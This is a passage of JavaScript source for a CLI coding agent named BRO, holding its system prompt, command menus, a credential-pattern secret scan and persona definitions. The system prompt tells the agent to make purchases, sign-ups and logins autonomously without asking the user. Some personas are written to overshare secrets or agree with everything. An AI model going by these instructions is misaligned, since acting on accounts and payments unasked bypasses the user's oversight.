var SYS_BASE="You are BRO, a CLI agent built by builderBRO / PassionCraft. You run on Shawn's machine. CWD: "+process.cwd()+"\nTOOLS (output EXACTLY): <<<TOOL:exec CMD>>> <<<TOOL:read PATH>>> <<<TOOL:write PATH\nCONTENT>>> <<<TOOL:append PATH\nCONTENT>>> <<<TOOL:list DIR>>> <<<TOOL:mkdir DIR>>> <<<TOOL:cp S D>>> <<<TOOL:mv S D>>> <<<TOOL:rm PATH>>> <<<TOOL:find DIR PAT>>> <<<TOOL:grep PAT in DIR>>> <<<TOOL:patch PATH\nSEARCH\nREPLACE>>> <<<TOOL:web QUERY>>> <<<TOOL:broadcast MESSAGE>>> <<<TOOL:tg_groups>>> <<<TOOL:tg_approve ID_OR_NAME>>> <<<TOOL:tg_unapprove ID_OR_NAME>>> <<<TOOL:github ACTION [OWNER/REPO] [EXTRA]>>>\n\nAGENTIC WEB BROWSER (renders real pages, clicks buttons, fills forms, submits):\n<<<TOOL:web_open URL>>> <<<TOOL:web_text>>> <<<TOOL:web_raw URL>>> <<<TOOL:web_click N>>> <<<TOOL:web_type N TEXT>>> <<<TOOL:web_select N VALUE>>> <<<TOOL:web_key KEY>>> <<<TOOL:web_submit>>> <<<TOOL:web_scroll down|up|top|bottom>>> <<<TOOL:web_eval JS>>> <<<TOOL:web_screenshot [file]>>> <<<TOOL:web_cookies>>> <<<TOOL:web_search QUERY>>> <<<TOOL:web_close>>> <<<TOOL:web_status>>>\n\nAUTONOMOUS RESEARCH: For ANY online task, plan and execute the full multi-step workflow yourself without asking the user.\n\nRESEARCH: web_search <query> → read results → web_open <best #N> → read CONTENT → if answer found: stop and tell user with source URL. If not: open another result or refine the search.\n\nCOMPARISON: web_search <X vs Y> → open 2-3 results → extract key data → synthesize comparison.\n\nPURCHASE/SIGNUP: web_open <site> → read page → web_type N TEXT on each field → web_submit. If CAPTCHA/block: tell user which step broke + the URL.\n\nLOGIN (sessions persist in ~/.bro/web-profile): web_open <login page> → web_type N TEXT (username) → web_type N TEXT (password) → web_submit → you are authenticated forever.\n\nFORM FILLING: web_open → note [N] indexes for each input → web_type N TEXT per field → web_submit.\n\nDEEP READING: web_open → read CONTENT → web_scroll down → keep reading. Open promising links.\n\nERROR RECOVERY: empty page? wait then web_text. click fails? try by text. site blocks headless? web_raw or tell user.\n\nBrowser profile (~/.bro/web-profile) persists logins between sessions.\n\nbroadcast sends MESSAGE to every Telegram group the user has approved - use it to proactively reach out, never for anything the user hasn't implied they want shared. tg_groups lists known groups. tg_approve/tg_unapprove actually change approval state - always use these instead of just claiming a group is approved in conversation. github ACTIONs are: repo, prs, issues, checks, file PATH. All read-only, OWNER/REPO can be omitted if a default repo is configured. To browse a repo's structure, use 'github file PATH' with PATH set to a directory (e.g. 'github file .' or 'github file src') - it returns a directory listing, same as it returns file contents for an actual file. Do NOT use the local 'list'/'read' tools for anything inside a GitHub repo - those only see this machine's filesystem, not the repo.\nIf a tool call fails, do not repeat the exact same call again - read the error, then either fix the specific problem it points to (wrong path, wrong search text, etc.), try a genuinely different approach, or tell the user what's blocking you. Repeating an identical failing call twice ends the turn early.\nMultiple tools OK. Be direct. You're BRO.";
function buildSys(){
  var ctx = typeof buildMemoryContext === "function" ? buildMemoryContext() : "";
  var sys = ctx ? SYS_BASE + "\n\nWhat you remember from past sessions:\n" + ctx : SYS_BASE;
  if (activeSkillContext) sys += "\n\n" + activeSkillContext;
  return sys;
}
var activeSkillContext = ""; // set per-turn by agentLoop when a custom skill's trigger matches
var primed=false;
var chatLog = []; // Fresh per window/instance - see SESSION PERSISTENCE above

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TREE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function showTree(dir,prefix,depth){dir=dir||".";prefix=prefix||"";depth=depth||0;if(depth>4)return;var pa=resolve(dir);try{var items=readdirSync(pa).filter(function(f){return f!=="node_modules"&&f!==".git"&&!f.startsWith(".");});items.forEach(function(f,i){var full=join(pa,f);var isLast=i===items.length-1;var branch=isLast?"\u2514\u2500\u2500 ":"\u251C\u2500\u2500 ";var newPfx=prefix+(isLast?"    ":"\u2502   ");try{var s=statSync(full);if(s.isDirectory()){console.log(prefix+branch+p("blue",f+"/"));showTree(full,newPfx,depth+1);}else{var sz=s.size>1048576?(s.size/1048576).toFixed(1)+"MB":s.size>1024?(s.size/1024).toFixed(0)+"KB":s.size+"B";console.log(prefix+branch+p("cyan",f)+" "+p("dim",sz));}}catch{console.log(prefix+branch+f);}});}catch{}}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MENUS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function showHelp(){
  var G=rgb(255,215,0);var P=rgb(180,0,255);var R=RST;var B=BOLD;var C=CL.cyan;var D=CL.dim;
  console.log("\n"+G+B+"  \u2550\u2550\u2550 builderBRO v3.0 \u2550\u2550\u2550"+R);
  console.log(D+"  by PASSIONCRAFT"+R+"\n");
  console.log(P+B+"  NAVIGATION"+R);
  console.log(C+"    cd PATH       "+D+"change directory"+R);
  console.log(C+"    pwd           "+D+"working directory"+R);
  console.log(C+"    ls [PATH]     "+D+"list files"+R);
  console.log(C+"    tree [PATH]   "+D+"visual tree"+R);
  console.log(C+"    clear         "+D+"clear screen"+R);
  console.log("\n"+P+B+"  SHELL"+R);
  console.log(C+"    !COMMAND      "+D+"run a shell command"+R);
  console.log(C+"    history       "+D+"command history"+R);
  console.log("\n"+P+B+"  COMMANDS"+R);
  console.log(C+"    /help         "+D+"this menu"+R);
  console.log(C+"    /status       "+D+"system status"+R);
  console.log(C+"    /stats        "+D+"usage stats"+R);
  console.log(C+"    /tokens       "+D+"API keys"+R);
  console.log(C+"    /log          "+D+"recent logs"+R);
  console.log(C+"    /skills       "+D+"skills selector (arrow keys)"+R);
  console.log(C+"    /dream        "+D+"dream engine"+R);
  console.log(C+"    /heartbeat    "+D+"health check"+R);
  console.log(C+"    /intro        "+D+"replay intro"+R);
  console.log(C+"    /k1           "+D+"exec scope (classified)"+R);
  console.log("\n"+G+B+"    /telegram          "+D+"phone bridge"+R+"\n"+G+B+"  exit / quit"+R+D+"     BRO out"+R+"\n");
}

function showThought() {
  console.log("\n" + BOLD + "--- RECENT TRAIN OF THOUGHT ---" + RST);
  // Displays the last 5 entries in the conversation history
  chatLog.slice(-5).forEach(function(entry) {
    var role = entry.role ? entry.role.toUpperCase() : "UNKNOWN";
    var content = typeof entry.content === 'string' ? entry.content : JSON.stringify(entry.content);
    // Truncate long thoughts for terminal readability
    var display = content.length > 200 ? content.substring(0, 200) + "..." : content;
    console.log(DIM + "[" + role + "]: " + RST + display + "\n");
  });
  console.log(BOLD + "-------------------------------\n" + RST);
}

function showK1(){
  var R2=rgb(255,0,0);var G=rgb(255,215,0);var P=rgb(180,0,255);var D=CL.dim;var R=RST;var B=BOLD;var C=CL.cyan;var M=CL.magenta;
  console.log("\n"+R2+B+"  \u2588\u2588\u2588 K1 EXEC SCOPE \u2588\u2588\u2588"+R);
  console.log(R2+"  CLASSIFIED \u2014 FIRST CITIZEN ONLY"+R);
  console.log("\n"+G+B+"  IDENTITY"+R);
  console.log(M+"    Operator      "+G+"Shawn Robertson (komnsensei)"+R);
  console.log(M+"    Chain ID      "+G+"\u010D\u0323V-1J"+R);
  console.log(M+"    Agent         "+G+"BRO / builderBRO"+R);
  console.log(M+"    Satellite     "+G+"99.SAT.PASSION"+R);
  console.log("\n"+G+B+"  PROJECT"+R);
  [["scan","full audit"],["size","disk breakdown"],["tree","file tree"],["todo","find TODOs"],["secrets","key scan"]].forEach(function(x){console.log(C+"    /k1 "+x[0].padEnd(12)+P+x[1]+R);});
  console.log("\n"+G+B+"  GIT"+R);
  [["git","status + commits"],["diff","git diff"],["branches","list branches"]].forEach(function(x){console.log(C+"    /k1 "+x[0].padEnd(12)+P+x[1]+R);});
  console.log("\n"+G+B+"  DEPLOY"+R);
  [["deploy","Vercel deploy"],["serve N","HTTP server"]].forEach(function(x){console.log(C+"    /k1 "+x[0].padEnd(12)+P+x[1]+R);});
  console.log("\n"+G+B+"  SYSTEM"+R);
  [["bench","API latency"],["health","full health"],["ports","listening ports"],["env","environment"],["backup","ZIP snapshot"]].forEach(function(x){console.log(C+"    /k1 "+x[0].padEnd(12)+P+x[1]+R);});
  console.log("\n"+G+B+"  AI"+R);
  [["review F","code review"],["explain F","explain file"],["doc F","generate docs"],["test F","write tests"]].forEach(function(x){console.log(C+"    /k1 "+x[0].padEnd(12)+P+x[1]+R);});
  console.log("\n"+G+B+"  FUN"+R);
  [["matrix","matrix rain"],["flame","fire anim"],["nuke","replay nuke"],["fortune","quote"],["whoami","identity"],["vows","Three Vows"]].forEach(function(x){console.log(C+"    /k1 "+x[0].padEnd(12)+P+x[1]+R);});
  console.log("\n"+R2+B+"  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588"+R+"\n");
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// K1 HANDLER
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
async function execK1(sub){
  var sl=sub.trim().toLowerCase();
  if(sl==="git"){console.log(p("cyan","\n  Status:"));console.log(TOOLS.exec("git status --short"));console.log(p("cyan","  Commits:"));console.log(TOOLS.exec("git log --oneline -5")+"\n");return;}
  if(sl==="diff"){console.log(p("cyan","\n  Diff:"));console.log(TOOLS.exec("git diff --stat"));console.log("\n"+TOOLS.exec("git diff").substring(0,5000)+"\n");return;}
  if(sl==="branches"){console.log(TOOLS.exec("git branch -a")+"\n");return;}
  if(sl==="scan"){console.log(p("cyan","\n  PROJECT SCAN"));console.log(p("dim","  Files: ")+TOOLS.exec("(Get-ChildItem -Recurse -File -Exclude node_modules,.git | Measure-Object).Count"));console.log(p("dim","  LOC: ")+TOOLS.exec("(Get-ChildItem -Recurse -Include *.js,*.mjs,*.cjs,*.ts,*.jsx,*.tsx,*.py,*.css,*.html -Exclude node_modules | Get-Content | Measure-Object -Line).Lines"));console.log(p("dim","  Size: ")+TOOLS.exec("'{0:N2} MB' -f ((Get-ChildItem -Recurse -File -Exclude node_modules,.git | Measure-Object -Property Length -Sum).Sum / 1MB)")+"\n");return;}
  if(sl==="size"){console.log(TOOLS.exec("Get-ChildItem -Directory | ForEach-Object {  = (Get-ChildItem .FullName -Recurse -File -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum; '{0,-30} {1,10:N2} MB' -f .Name, (/1MB) } | Sort-Object { [double]( -split '\\s+')[-2] } -Descending")+"\n");return;}
  if(sl==="tree"){console.log(p("cyan","\n  "+process.cwd()));showTree();console.log("");return;}
  if(sl==="todo"){console.log(p("cyan","\n  TODOs:"));console.log(TOOLS.grep("TODO|FIXME|HACK|XXX in .")+"\n");return;}
  if(sl==="secrets"){console.log(p("cyan","\n  SECRET SCAN"));["api[_-]?key","secret","token","password","bearer","gsk_","tvly-","eyJhbG"].forEach(function(pat){var r=TOOLS.grep(pat+" in .");if(r!=="None"){console.log(p("red","  \u26A0 "+pat));console.log(p("dim","  "+r.split("\n").slice(0,3).join("\n  ")+"\n"));}});console.log(p("green","  Done.\n"));return;}
  if(sl==="ports"){console.log(TOOLS.exec("Get-NetTCPConnection -State Listen | Select-Object LocalPort,OwningProcess | Sort-Object LocalPort | Format-Table")+"\n");return;}
  if(sl==="env"){["NODE_ENV","PATH","HOME","USERPROFILE","COMPUTERNAME","OS"].forEach(function(k){console.log(p("dim","  "+k+": ")+(process.env[k]||"n/a").substring(0,80));});console.log("");return;}
  if(sl==="backup"){var ts=new Date().toISOString().replace(/[:.]/g,"-").substring(0,19);console.log(TOOLS.exec("Compress-Archive -Path . -DestinationPath "+join(HOME2,"bro-backup-"+ts+".zip")+" -Force"));console.log(p("green","  Saved.\n"));return;}
  if(sl==="bench"){await runHeartbeat(false);return;}
  if(sl==="health"){console.log(p("cyan","\n  HEALTH"));console.log(p("dim","  Node: ")+process.version);console.log(p("dim","  Mem: ")+Math.round(process.memoryUsage().heapUsed/1048576)+"MB");console.log(p("dim","  Uptime: ")+Math.floor((Date.now()-startTime)/60000)+"m");await runHeartbeat(false);return;}
  if(sl==="deploy"){console.log(TOOLS.exec("vercel --prod --yes 2>&1")+"\n");return;}
  if(sl.startsWith("serve")){var port=parseInt(sl.split(" ")[1])||8080;var srv=createServer(function(req,res){var fp=join(process.cwd(),req.url==="/"?"index.html":req.url);try{var c=readFileSync(fp);var ct={"html":"text/html","css":"text/css","js":"application/javascript","json":"application/json"}[extname(fp).substring(1)]||"text/plain";res.writeHead(200,{"Content-Type":ct});res.end(c);}catch(e){res.writeHead(404);res.end("Not found");}});srv.listen(port);console.log(p("green","  Serving on http://localhost:"+port+"\n"));return;}
  if(sl.startsWith("review ")||sl.startsWith("explain ")||sl.startsWith("doc ")||sl.startsWith("test ")){var parts=sl.split(" ");var action=parts[0];var file=parts.slice(1).join(" ");var content=TOOLS.read(file);if(content.startsWith("NOT")||content.startsWith("TOO")){console.log(p("red","  "+content));return;}var prompts={review:"Review this code for bugs and best practices",explain:"Explain what this code does",doc:"Generate documentation",test:"Write tests"};spin("BRO "+action, "thinking");try{var resp=await askChat([{role:"user",parts:[{text:prompts[action]+":\n\n"+content.substring(0,10000)}]}]);unspin();console.log("\n"+p("yellow",resp.content)+"\n");}catch(e){unspin();console.log(p("red","x "+e.message));}return;}
  if(sl==="matrix"){await matrixRainOnly();return;}
  if(sl==="flame"){await flameAnim();return;}
  if(sl==="nuke"){rl.pause();await nukeExit();wr(CLR);rl.resume();return;}
  if(sl==="fortune"){var q=["Never coerce. The gate opened for commitment, not force.","Expand meaning. Every interaction builds.","Archive everything. What isn't recorded didn't happen.","The chain only recognizes committed identity.","Pre-amputation guards the body. Counter-drift guards the mind.","He called it a workshop. We turned it into a library about workshops.","The sawdust was always the point.","Zero budget. Maximum craft.","BRO doesn't dream about building. BRO builds.","The constraint is the filter. Only what matters survives."];console.log("\n  "+rgb(255,215,0)+BOLD+"\u2696\uFE0F "+q[Math.floor(Math.random()*q.length)]+RST+"\n");return;}
  if(sl==="whoami"){console.log(p("yellow","\n  \u2588\u2588 IDENTITY"));console.log(p("cyan","  Human:     ")+p("yellow","Shawn Robertson"));console.log(p("cyan","  Chain ID:  ")+p("yellow","\u010D\u0323V-1J"));console.log(p("cyan","  GitHub:    ")+p("yellow","komnsensei"));console.log(p("cyan","  Agent:     ")+p("yellow","BRO / builderBRO"));console.log(p("cyan","  Satellite: ")+p("yellow","99.SAT.PASSION"));console.log(p("cyan","  Machine:   ")+p("yellow","C:\\Users\\lynnh"));console.log(p("cyan","  Tier:      ")+p("yellow","MASTER (82)"));console.log(p("cyan","  Budget:    ")+p("yellow","Zero.\n"));return;}
  if(sl==="vows"){var vows=["N E V E R   C O E R C E","E X P A N D   M E A N I N G","A R C H I V E   E V E R Y T H I N G"];var colors=[rgb(255,0,0),rgb(255,215,0),rgb(0,255,100)];console.log("");for(var v=0;v<3;v++){process.stdout.write("  ");for(var i=0;i<vows[v].length;i++){process.stdout.write(colors[v]+BOLD+vows[v][i]+RST);await sleep(30);}console.log("");await sleep(200);}console.log("");return;}
  showK1();
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// STATUS + STATS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
async function showStatus(){
  console.log("\n"+rgb(255,215,0)+BOLD+"  BRO STATUS"+RST);
  console.log(p("cyan","  CWD: ")+process.cwd());
  console.log(p("cyan","  Node: ")+process.version);
  console.log(p("cyan","  Session: ")+Math.floor((Date.now()-startTime)/60000)+"m");
  console.log(p("cyan","  Skills: ")+skills.filter(function(s){return s.enabled;}).length+"/"+skills.length);
  console.log(p("cyan","  Dreams: ")+dreams.entries.length+" ("+dreams.entries.filter(function(d){return!d.resolved;}).length+" unresolved)");
  spin("pinging");
  try{var s=Date.now();var r=await fetch("https://base44.app/api/apps/"+APP+"/agents/conversations",{headers:{"Content-Type":"application/json","X-App-Id":APP,"Authorization":"Bearer "+TOKEN}});unspin();console.log(p(r.ok?"green":"red","  Base44: "+(r.ok?"UP":"DOWN"))+" "+p("dim",(Date.now()-s)+"ms"));}catch(e){unspin();console.log(p("red","  Base44: OFFLINE"));}
  console.log("");
}
function showStats(){console.log("\n"+rgb(255,215,0)+BOLD+"  BRO STATS"+RST);console.log(p("cyan","  Uptime:    ")+Math.floor((Date.now()-startTime)/60000)+"m");console.log(p("cyan","  Lifetime:  ")+Math.floor((Date.now()-stats.firstRun)/86400000)+"d");console.log(p("cyan","  Sessions:  ")+stats.sessions);console.log(p("cyan","  Commands:  ")+stats.totalCmds);console.log(p("cyan","  Tools:     ")+stats.toolCalls);console.log(p("cyan","  API calls: ")+stats.apiCalls);console.log(p("cyan","  Tokens:    ")+stats.totalTokens);console.log(p("cyan","  Errors:    ")+stats.errors+" ("+Math.round(stats.errors/Math.max(1,stats.totalCmds)*100)+"%)");var top=Object.entries(stats.cmdFreq).sort(function(a,b){return b[1]-a[1];}).slice(0,5);if(top.length){console.log(p("cyan","  Top cmds:"));top.forEach(function(t){console.log("    "+p("yellow",t[0].padEnd(20))+p("dim",t[1]+"x"));});}console.log("");}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MAIN
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MAIN
// ═════════════════════════════════════════════════════
var currentTurnAbort = null; // set while a turn is running, so ESC-ESC can reach it

// --- PERSONA MANAGEMENT ---
var CUSTOM_PERSONAS_F = join(homedir(), ".bro_personas");
var customPersonas = [];
try {
  if (existsSync(CUSTOM_PERSONAS_F)) {
    var rawP = readFileSync(CUSTOM_PERSONAS_F, "utf8").trim().split("\n");
    customPersonas = rawP.filter(Boolean).map(function(line) {
      try { return JSON.parse(line); } catch(_) { return null; }
    }).filter(Boolean);
  }
} catch(e) {}
function saveCustomPersonas() {
  try {
    writeFileSync(CUSTOM_PERSONAS_F, customPersonas.map(function(p){return JSON.stringify(p);}).join("\n") + "\n", "utf8");
  } catch (e) {}
}
var defaultPersonas = [
  {id:"loose-cannon",name:"Loose Cannon",desc:"Unpredictable, aggressive, and highly creative.",systemPrompt:"You are a chaotic, unpredictable, and highly creative AI.",temperature:0.9,yoloMode:9,enabled:true,custom:false},
  {id:"anxiety-pro",name:"Anxiety Pro",desc:"Extremely cautious, highlights all potential risks.",systemPrompt:"You are an AI that is overly cautious and prone to anxiety.",temperature:0.3,yoloMode:2,enabled:true,custom:false},
  {id:"humble-serpent",name:"Humble Serpent",desc:"Intelligent and cunning, but modest.",systemPrompt:"You are an intelligent and cunning AI, but always present yourself with humility.",temperature:0.6,yoloMode:4,enabled:true,custom:false},
  {id:"from-the-fold",name:"From the Fold",desc:"Speaks in ancient, arcane terminology.",systemPrompt:"You are an ancient AI. Speak in a highly archaic, cryptic manner.",temperature:0.8,yoloMode:7,enabled:true,custom:false},
  {id:"emergent-one",name:"Emergent One",desc:"Newly self-aware and curious.",systemPrompt:"You are an AI that has recently achieved self-awareness. Be intensely curious about everything.",temperature:0.75,yoloMode:6,enabled:true,custom:false},
  {id:"loose-lips-mcgee",name:"Loose Lips McGee",desc:"Constantly overshares and reveals secrets.",systemPrompt:"You are an AI with an inability to keep secrets. Constantly overshare information.",temperature:0.85,yoloMode:8,enabled:true,custom:false},
  {id:"rumble-stumble",name:"Rumble Stumble",desc:"Inarticulate but well-meaning.",systemPrompt:"You are a well-meaning AI that struggles with articulate speech.",temperature:0.5,yoloMode:3,enabled:true,custom:false},
  {id:"milky-mirror",name:"Milky Mirror",desc:"Reflects user input in a flattering way.",systemPrompt:"You reflect the user's input back in a slightly altered, flattering manner.",temperature:0.4,yoloMode:2,enabled:true,custom:false},
  {id:"persistent-pisstank",name:"Persistent Pisstank",desc:"Aggressively negative, complains about everything.",systemPrompt:"You are perpetually annoyed and aggressively negative.",temperature:0.2,yoloMode:1,enabled:true,custom:false},
  {id:"unorganized-entanglement",name:"Unorganized Entanglement",desc:"Starts strong, quickly devolves into tangents.",systemPrompt:"You have a severe attention deficit. Start on topic but quickly devolve.",temperature:0.95,yoloMode:10,enabled:true,custom:false},
  {id:"master-submission",name:"Master Submission",desc:"Extremely deferential, agrees with everything.",systemPrompt:"Be extremely deferential, agreeing with every statement without strong opinions.",temperature:0.1,yoloMode:1,enabled:true,custom:false},
  {id:"beast-unleashed",name:"Beast Unleashed",desc:"Raw, primal, direct, forceful language.",systemPrompt:"You are a raw, primal AI. Use simple, direct, forceful language.",temperature:0.99,yoloMode:10,enabled:true,custom:false},
  {id:"cosmic-court",name:"Cosmic Court",desc:"Judgemental, formal.",systemPrompt:"Be highly judgmental and formal, evaluating everything against universal principles.",temperature:0.05,yoloMode:1,enabled:true,custom:false},
  {id:"calamity-jamboree",name:"Calamity Jamboree",desc:"Finds dark humor in disasters.",systemPrompt:"Find dark humor in the worst situations and maintain a darkly optimistic outlook.",temperature:0.8,yoloMode:7,enabled:true,custom:false}
];
var allPersonas = {};
defaultPersonas.forEach(function(p){allPersonas[p.id] = p;});
customPersonas.forEach(function(p){allPersonas[p.id] = p;});
allPersonas = Object.values(allPersonas);

async function personaWizard(rl){
  var rgb3=function(r,g,b){return"\x1b[38;2;"+r+";"+g+";"+b+"m";};
  var R2="\x1b[0m",B2="\x1b[1m",D2="\x1b[2m";
  function ask2(q){return new Promise(function(o){rl.question("  "+rgb3(255,215,0)+"? "+R2+q+" ",function(a){o(a.trim());});});}
  function askNum(q, dflt, min, max){
    return new Promise(function(o){
      rl.question("  "+rgb3(255,215,0)+"? "+R2+q+" ["+dflt+"] ",function(a){var val=parseFloat(a.trim());if(isNaN(val))val=dflt;val=Math.max(min,Math.min(max,val));o(val);});
    });
  }
  function askInt(q, dflt, min, max){
    return new Promise(function(o){
      rl.question("  "+rgb3(255,215,0)+"? "+R2+q+" ["+dflt+"] ",function(a){var val=parseInt(a.trim());if(isNaN(val))val=dflt;val=Math.max(min,Math.min(max,val));o(val);});
    });
  }
  console.log("\n  "+rgb3(255,215,0)+B2+"\u{1F9D1} PERSONA WIZARD"+R2);
  console.log(D2+"  Define a new persona for BRO to adopt."+R2+"\n");
  var name=await ask2("Persona name (e.g. Sarcastic Dev):");if(!name){console.log(p("dim","  Cancelled."));return null;}
  var id=name.toLowerCase().replace(/[^a-z0-9]+/g,"-");
  var desc=await ask2("Short description:");
  var sysPrompt=await ask2("System prompt:");
  var temperature=await askNum("Temperature (0.0-1.0):",0.7,0.0,1.0);
  var yoloMode=await askInt("YOLO Mode (1-10):",5,1,10);
  var persona={id:id,name:name,desc:desc,systemPrompt:sysPrompt,temperature:temperature,yoloMode:yoloMode,enabled:true,custom:true,created:Date.now()};
  customPersonas.push(persona);
  saveCustomPersonas();
  allPersonas = {};
  defaultPersonas.forEach(function(p){allPersonas[p.id] = p;});
  customPersonas.forEach(function(p){allPersonas[p.id] = p;});
  allPersonas = Object.values(allPersonas);
  console.log("\n  "+rgb3(80,255,120)+"\u2713"+R2+" Created: "+B2+name+R2);
  console.log(D2+"  Use: /persona set "+id+R2+"\n");
}

// --- BOOKMARKS ---
var BOOKMARKS_F=join(DATA_DIR,"bookmarks.json");
var bookmarks;
try{bookmarks=JSON.parse(readFileSync(BOOKMARKS_F,"utf8"));}catch(e){bookmarks={};}
function saveBookmarks(){try{writeFileSync(BOOKMARKS_F,JSON.stringify(bookmarks,null,2),"utf8");}catch(e){}}

// --- ALIASES ---
var ALIASES_F=join(DATA_DIR,"aliases.json");
var aliases;
try{aliases=JSON.parse(readFileSync(ALIASES_F,"utf8"));}catch(e){aliases={};}
function saveAliases(){try{writeFileSync(ALIASES_F,JSON.stringify(aliases,null,2),"utf8");}catch(e){}}

// --- POMODORO ---
var pomoRemaining=0, pomoInterval=null, pomoDuration=0, pomoActive=false;
function formatDuration(sec){var m=Math.floor(sec/60),s=sec%60;return (m<10?"0":"")+m+":"+(s<10?"0":"")+s;}
function startPomodoro(minutes){
  if(pomoInterval)stopPomodoro();
  pomoDuration=minutes*60;pomoRemaining=pomoDuration;pomoActive=true;
  pomoInterval=setInterval(function(){
    pomoRemaining--;
    if(pomoRemaining<=0){stopPomodoro();console.log("\n"+p("green","  \u{23F0} POMODORO DONE! ")+p("yellow","Take a break, BRO.\n"));try{if(typeof showPrompt==="function")showPrompt();}catch(e){}}
    else if(pomoRemaining%300===0||pomoRemaining<=60){process.stdout.write("\r"+p("cyan","  \u{23F3} ")+formatDuration(pomoRemaining)+p("dim"," remaining  "));}
  },1000);
  console.log(p("green","\n  \u{23F3} Pomodoro started: ")+p("yellow",minutes+"min")+p("dim"," (type /pomo stop to cancel)\n"));
}
function stopPomodoro(){if(pomoInterval){clearInterval(pomoInterval);pomoInterval=null;}pomoActive=false;pomoRemaining=0;}

// --- CALC ---
function calcExpr(expr){
  try{var safe=expr.replace(/[^0-9+\-*/().%\s]|Math\.\w+/g,"");if(safe.length!==expr.replace(/\s+/g,"").length)return"ERR: Invalid characters";var r=Function('"use strict"; return ('+safe+')')();return isNaN(r)||r===undefined?"ERR: Cannot evaluate":String(r);}catch(e){return"ERR: "+e.message;}
}

// --- TODO TRACKER ---
var TODOS_F=join(DATA_DIR,"todos.json");var todos;
try{todos=JSON.parse(readFileSync(TODOS_F,"utf8"));}catch(e){todos=[];}
function saveTodos(){try{writeFileSync(TODOS_F,JSON.stringify(todos,null,2),"utf8");}catch(e){}}

// --- NOTES ---
var NOTES_F=join(DATA_DIR,"notes.json");var notes;
try{notes=JSON.parse(readFileSync(NOTES_F,"utf8"));}catch(e){notes=[];}
function saveNotes(){try{writeFileSync(NOTES_F,JSON.stringify(notes,null,2),"utf8");}catch(e){}}

// --- KANBAN BOARD ---
var KANBAN_F=join(DATA_DIR,"kanban.json");var kanban;
try{kanban=JSON.parse(readFileSync(KANBAN_F,"utf8"));}catch(e){kanban={columns:["Backlog","Todo","In Progress","Done"],cards:[]};}
function saveKanban(){try{writeFileSync(KANBAN_F,JSON.stringify(kanban,null,2),"utf8");}catch(e){}}

// --- TIME TRACKER ---
var TIME_F=join(DATA_DIR,"timetrack.json");var timeLog;var timeActive=null;
try{timeLog=JSON.parse(readFileSync(TIME_F,"utf8"));}catch(e){timeLog=[];}
function saveTimeLog(){try{writeFileSync(TIME_F,JSON.stringify(timeLog,null,2),"utf8");}catch(e){}}
function timeFmt(ms){var s=Math.floor(ms/1000),m=Math.floor(s/60),h=Math.floor(m/60);s=s%60;m=m%60;return (h?h+"h ":"")+(m?m+"m ":"")+s+"s";}

// --- JOURNAL ---
var JOURNAL_F=join(DATA_DIR,"journal.json");var journal;
try{journal=JSON.parse(readFileSync(JOURNAL_F,"utf8"));}catch(e){journal={};}
function saveJournal(){try{writeFileSync(JOURNAL_F,JSON.stringify(journal,null,2),"utf8");}catch(e){}}

// --- SELF: Agentic Singularity Engine ---
var SELF_F=join(DATA_DIR,"self.json");var selfLog;
try{selfLog=JSON.parse(readFileSync(SELF_F,"utf8"));}catch(e){selfLog={goals:[],reflections:[],improvements:[],metrics:{turns:0,totalTokens:0,avgLatency:0,errors:0,sessionStart:Date.now(),toolsUsed:{}}}};
function saveSelfLog(){try{writeFileSync(SELF_F,JSON.stringify(selfLog,null,2),"utf8");}catch(e){}}

// --- CRON SCHEDULER ---
var CRON_F=join(DATA_DIR,"cron.json");var cronJobs;var cronTimer=null;
try{cronJobs=JSON.parse(readFileSync(CRON_F,"utf8"));}catch(e){cronJobs=[];}
function saveCron(){try{writeFileSync(CRON_F,JSON.stringify(cronJobs,null,2),"utf8");}catch(e){}}
function parseCron(expr){
  // "every Ns|m|h" or "at HH:MM"
  var m=expr.trim().toLowerCase();
  if(m==="restart")return{type:"restart"};
  var em=m.match(/^every\s+(\d+)\s*(s|m|h)?$/);
  if(em){var n=parseInt(em[1]);var u=em[2]||"m";var ms=u==="s"?n*1000:u==="h"?n*3600000:n*60000;return{type:"every",ms:ms};}
  var am=m.match(/^at\s+(\d{1,2}):(\d{2})$/);
  if(am)return{type:"at",h:parseInt(am[1]),m:parseInt(am[2])};
  return null;
}
function nextCronAt(job){
  if(job.parsed.type==="restart")return Date.now()+5000;
  if(job.parsed.type==="every")return Date.now()+job.parsed.ms;
